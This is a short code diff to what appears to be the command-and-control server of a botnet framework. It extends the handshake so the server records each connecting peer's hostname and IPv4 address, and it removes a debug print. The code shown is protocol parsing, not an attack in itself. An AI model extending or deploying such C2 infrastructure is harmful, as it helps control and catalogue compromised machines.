@@ -7,7 +7,7 @@
 #include "cnc.h"
 
 LAIKAPKT_SIZE laikaC_pktSizeTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + crypto_kx_PUBLICKEYBYTES,
+    [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_IPV4_LEN,
     [LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ] = sizeof(uint8_t),
 };
 
@@ -28,6 +28,14 @@ void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, v
 
     /* read peer's public key */
     laikaS_read(&peer->sock, peer->peerPub, sizeof(peer->peerPub));
+
+    /* read hostname & ipv4 */
+    laikaS_read(&peer->sock, peer->hostname, LAIKA_HOSTNAME_LEN);
+    laikaS_read(&peer->sock, peer->ipv4, LAIKA_IPV4_LEN);
+
+    /* restore null-terminator */
+    peer->hostname[LAIKA_HOSTNAME_LEN-1] = 0;
+    peer->ipv4[LAIKA_IPV4_LEN-1] = 0;
 
     /* gen session keys */
     if (crypto_kx_server_session_keys(peer->inKey, peer->outKey, cnc->pub, cnc->priv, peer->peerPub) != 0)
@@ -101,7 +109,6 @@ void laikaC_onAddPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
 
     /* notify connected panels of the newly connected peer */
     for (i = 0; i < cnc->panelCount; i++) {
-        LAIKA_DEBUG("sending new peer to %lx\n", peer);
         laikaC_sendNewPeer(cnc->panels[i], peer);
     }
 }
